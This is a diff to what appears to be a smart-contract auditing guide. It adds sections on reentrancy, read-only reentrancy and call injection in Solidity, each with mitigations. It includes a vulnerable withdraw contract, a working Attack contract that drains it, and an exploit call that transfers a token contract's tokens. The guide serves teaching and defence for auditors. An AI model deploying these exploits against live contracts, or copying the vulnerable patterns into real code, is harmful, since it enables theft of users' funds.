@@ -5,7 +5,7 @@ The below document contains a list of vulnerabilities and simple mistakes that a
 This repository is intended to be used as a guide for new and experienced auditors alike. 
 
 ## 1: Data
-### 1.1: Integer overflow / underflow
+### 1.1: Integer Overflow / Underflow
 
 Integer overflow occurs when the result of an arithmetic operation exceeds the maximum value that can be stored in the integer's bit representation. Integer underflow occurs when an unsigned integer is set to a negative value. 
 
@@ -143,9 +143,113 @@ ERC20(this).safeTransferFrom(msg.sender, to, amount);
 
 ### 4.1: Reentrancy vulnerability
 
-### 4.2: Read-only reentrancy
+A reentrancy attack occurs when a contract incorrectly implements an external call to another untrusted contract. During a reentrancy attack, an attacker is able to make a recursive call back to the original function in an attempt to drain funds. This occurs when state variables used to validate a function's caller are not updated prior to an external call, and hence reentering the function will do so with the same variable values (despite the contract sending ether via an external call).
 
-### 4.3: Interaction occurs before state updated
+**Example**
+Below is an example of a contract that is vulnerable to a reentrancy attack. This contract holds a map of account balances that allow a user to call a `withdraw` function. However, this functions calls `send` which transfers control to the calling contract without decreasing their balance until after `send` has finished executing. As a result, the attacker can repeatedly withdraw money they do not have. Credit for this explanation goes to GitHub user [crytic](https://github.com/crytic/not-so-smart-contracts/tree/master/reentrancy).
+``` solidity
+pragma solidity ^0.8.17;
+
+contract DepositFunds {
+    mapping(address => uint) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+}
+```
+The following contract shows how the vulnerable contract can be exploited. An attacker takes advantage of the non-updated state by continuously calling the `withdraw()` function in the fallback method.
+
+``` solidity
+pragma solidity ^0.8.17;
+
+contract Attack {
+    DepositFunds public depositFunds;
+
+    constructor(address _depositFundsAddress) {
+        depositFunds = DepositFunds(_depositFundsAddress);
+    }
+
+    // Fallback is called when DepositFunds sends Ether to this contract.
+    fallback() external payable {
+        if (address(depositFunds).balance >= 1 ether) {
+            depositFunds.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        depositFunds.deposit{value: 1 ether}();
+        depositFunds.withdraw();
+    }
+}
+```
+
+Some example of popular reentrancy attacks are the [Dao hack](https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/) and the [Spank Chain hack](https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe).
+
+**Mitigations**
+- Follow the **Check, Effect, Interaction** pattern. That is where the necessary checks are made (valid address etc.), the state changes are then made to the contract, and finally the external call is made. This ensures that no matter what happens within an external call, the contract state has already changed.
+- Use a reentrancy function modifier. [OpenZeppelin](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) have a popular `ReentrancyGuard` library that when correctly applied prevents reentrancy attacks on functions with external calls.
+
+### 4.2: Read-Only Reentrancy
+
+A read-only reentrency is a reentrency scenario where a `view` function is reentered, which in most cases is unguarded as it does not modify the contract's state. However, if the state is inconsistent, wrong values could be reported. Other protocols relying on a return value can be tricked into reading the wrong state to perform unwanted actions.
+
+In DeFi, many protocols integrate with one-another to read token prices or read prices of wrapped tokens minted on particular protocols. This is possible when any lending protocol supports the pool tokens from other protocols as collateral, or allows staking.
+
+**Example**
+
+``` solidity
+contract MinimalReentrant {
+  uint256 private _number;
+
+  function vulnerableGetter() public view returns (uint256) {
+    return _number;
+  }
+
+  function reentrancyExploitable() public {
+    msg.sender.call("");
+    _number++;
+  }
+}
+
+contract MinimalVictim {
+  address public reentrant;
+
+  function doSmth() public {
+    MinimalReentrant reentrant = MinimalReentrant(reentrant);
+    uint256 value = reentrant.vulnerableGetter() + 1;
+  }
+}
+```
+
+In this *extremely* simple example, we see that the contract has all of the characteristics required for a read-only reentrancy attack. Those being:
+- There is some **state** (_number)
+- There is an external **call**, and the state is modified after the call
+- There is another contract (**MinimalVictim**) that is dependent on this state (uitilized by getter)
+
+As a result, an attacker can exploit this by manipulating the `vulnerableGetter()` function to return a higher `_number` value. This would in turn impact the fetched price in the `MinimalVictim` contract.
+
+**Mitigations**
+- A read-only reentrancy guard can be added to a function. This will verify whether the reentrancy guard has not been locked, and throw an error if it has.
+- A function with a reentrant modifier should be called first. If this fails, the contract will be locked, and reading from it should not be possible.
+
+
+### 4.3: Denial of Service - Block Gas Limit
+
+### 4.4: Denial of Service - Unexpected Revert
+
+External calls can fail accidentally or deliberately, which in turn can cause a DoS condition in the contract. 
 
 ### 4.4: Incorrect or lacking input validation
 
@@ -233,3 +337,31 @@ contract Delegation {
 
 **Mitigation**
 The common example of the `delegatecall` vulnerability can be prevented by using a stateless library (ie. a library contract that only exposes `pure` or `view` functions and doesn't modify state in client contracts).
+
+### 5.3: Unchecked External Call - Call Injection
+
+When the call data of an external function is controllable, it is easy to cause arbitrary function execution. As a result, an attacker can manipulate the behaviour of an external call when unchecked.
+
+**Example**
+The below example shows how an attacker could manipulate an unchecked external call to transfer all of the `tokenWhaleContract` tokens to them.
+
+``` solidity
+function approveAndCallcode(address _spender, uint256 _value, bytes memory _extraData)
+        public
+        returns (bool success)
+    {
+        allowance[msg.sender][_spender] = _value;
+
+        // Call the contract code
+        _spender.call(_extraData); // vulnerable point
+            // return true;
+    }
+
+// Exploit call
+TokenWhaleContract.approveAndCallcode(
+  address(TokenWhaleContract), 0, abi.encodeWithSignature("transfer(address,uint256)", address(alice), 1000)
+);
+```
+
+**Mitigation**
+The use of low level `call` should be avoided where possible, especially when controllable by a user via an `external` function.
